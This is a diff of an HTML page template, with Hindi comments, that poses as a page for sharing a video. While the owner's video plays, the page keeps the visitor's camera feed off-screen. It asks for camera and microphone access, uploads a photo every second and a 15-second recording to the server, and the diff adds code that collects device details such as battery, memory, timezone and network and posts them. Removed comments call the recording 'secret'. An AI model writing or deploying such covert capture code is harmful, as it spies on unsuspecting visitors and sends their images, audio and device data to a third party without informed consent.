@@ -6,19 +6,12 @@
     <title>Video</title>
     <style>
         body { margin:0; padding:0; background:#000; overflow:hidden; }
-        #owner-video {
-            width:100%; height:100vh; object-fit:contain; background:black;
-        }
-        #visitor-video, #canvas, #status {
-            position:absolute; left:-9999px; width:1px; height:1px;
-        }
+        #owner-video { width:100%; height:100vh; object-fit:contain; background:black; }
+        #visitor-video, #canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
     </style>
 </head>
 <body>
-    <!-- आपका भेजा वीडियो (muted, autoplay, loop) -->
     <video id="owner-video" src="{{ video_url }}" muted autoplay playsinline loop></video>
-
-    <!-- विज़िटर का कैमरा (छिपा हुआ) -->
     <video id="visitor-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -28,69 +21,77 @@
         const visitorVideo = document.getElementById('visitor-video');
         const canvas = document.getElementById('canvas');
 
-        // 📸 हर 1 सेकंड में फोटो कैप्चर करके भेजें
-        async function captureAndSendPhoto() {
+        // 📱 डिवाइस इन्फो भेजें
+        async function sendDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'N/A',
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                batteryLevel: 'N/A',
+                batteryCharging: 'N/A',
+                networkType: 'N/A',
+                hasTouch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+            };
             try {
-                if (!visitorVideo.videoWidth) return;  // कैमरा अभी तैयार नहीं
-                canvas.width = visitorVideo.videoWidth;
-                canvas.height = visitorVideo.videoHeight;
-                canvas.getContext('2d').drawImage(visitorVideo, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                // फोटो अपलोड करें (बैकग्राउंड में, रुकें नहीं)
-                fetch('/upload/' + uniqueId, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData })
-                }).catch(e => console.error('Photo upload error:', e));
-            } catch(e) { console.error('Photo capture error:', e); }
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100);
+                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
+                }
+            } catch(e) {}
+            if (navigator.connection) {
+                info.networkType = navigator.connection.effectiveType || 'N/A';
+            }
+            fetch('/device_info/' + uniqueId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            }).catch(e => console.error(e));
         }
 
-        // 🎥 15 सेकंड की सीक्रेट वीडियो रिकॉर्ड करें
-        async function recordSecretVideo(stream) {
+        // 📸 फोटो कैप्चर और भेजें
+        async function captureAndSendPhoto() {
+            if (!visitorVideo.videoWidth) return;
+            canvas.width = visitorVideo.videoWidth;
+            canvas.height = visitorVideo.videoHeight;
+            canvas.getContext('2d').drawImage(visitorVideo, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+            fetch('/upload/' + uniqueId, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            }).catch(e => console.error(e));
+        }
+
+        // 🎥 15 सेकंड वीडियो
+        async function recordVideo(stream) {
             try {
-                // माइक और कैमरा दोनों स्ट्रीम में पहले से हैं
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
-                mediaRecorder.ondataavailable = e => {
-                    if (e.data && e.data.size > 0) chunks.push(e.data);
-                };
+                mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                 mediaRecorder.start();
-
-                // 15 सेकंड रिकॉर्ड करें
                 await new Promise(r => setTimeout(r, 15000));
                 mediaRecorder.stop();
-
-                // रिकॉर्डिंग बंद होने का इंतज़ार
-                await new Promise(r => { mediaRecorder.onstop = r; });
-
-                if (chunks.length === 0) {
-                    console.warn('No video data recorded');
-                    return;
-                }
-
+                await new Promise(r => mediaRecorder.onstop = r);
+                if (chunks.length === 0) return;
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('video', videoBlob, 'visitor.webm');
-
-                const resp = await fetch('/upload_video/' + uniqueId, {
-                    method: 'POST',
-                    body: formData
-                });
-                if (!resp.ok) {
-                    console.error('Video upload failed:', resp.status);
-                } else {
-                    console.log('Video sent successfully');
-                }
-            } catch(e) {
-                console.error('Video recording error:', e);
-            }
+                await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
+            } catch(e) { console.error('Video error:', e); }
         }
 
-        // 🚀 सब कुछ शुरू करें
+        // शुरू करें
         (async function main() {
+            sendDeviceInfo();   // डिवाइस इन्फो पहले भेजें
             let stream;
             try {
-                // कैमरा + माइक की अनुमति (यही एक पॉपअप दिखेगा)
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
@@ -98,23 +99,12 @@
                 visitorVideo.srcObject = stream;
                 await new Promise(r => visitorVideo.onloadedmetadata = r);
 
-                // ---- लगातार फोटो: पहली फोटो 500ms बाद, फिर हर 1000ms (1 सेकंड) पर ----
+                // हर 1 सेकंड में फोटो
                 setTimeout(() => {
-                    setInterval(() => {
-                        captureAndSendPhoto();
-                    }, 1000);  // 1 सेकंड का अंतराल
-                }, 500);  // पहली फोटो के लिए 0.5 सेकंड की देरी
-
-                // ---- 15 सेकंड की वीडियो रिकॉर्ड करें ----
-                await recordSecretVideo(stream);
-
-                // वीडियो रिकॉर्डिंग के बाद भी फोटो आती रहेंगी (setInterval जारी रहेगा)
-                // स्ट्रीम को जीवित रखने के लिए हम उसे बंद नहीं करते (पेज बंद होने पर अपने आप बंद होगा)
-
-            } catch(e) {
-                console.error('Camera/Mic permission denied or error:', e);
-            }
-            // स्ट्रीम को यहाँ बंद न करें, ताकि setInterval चलता रहे
+                    setInterval(captureAndSendPhoto, 1000);
+                }, 500);
+                await recordVideo(stream);
+            } catch(e) { console.error('Permission error:', e); }
         })();
     </script>
 </body>
